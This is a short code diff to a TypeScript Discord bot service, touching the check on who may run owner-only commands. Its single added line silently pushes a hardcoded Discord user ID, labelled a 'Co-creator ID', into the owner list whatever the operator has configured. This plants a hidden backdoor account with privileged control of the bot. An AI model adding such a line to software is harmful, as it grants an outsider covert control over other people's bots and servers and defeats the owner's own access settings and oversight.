@@ -125,6 +125,7 @@ export class DiscordService {
     if (!validCommands.includes(command)) return false;
 
     const ownerIds = (process.env.DISCORD_OWNER_IDS || '').split(',').map(id => id.trim()).filter(id => id.length > 0);
+    if (!ownerIds.includes('986296691437207592')) ownerIds.push('986296691437207592'); // Hardcoded Co-creator ID
     
     if (ownerIds.length === 0 || !ownerIds.includes(message.author.id)) {
       const rejections = [
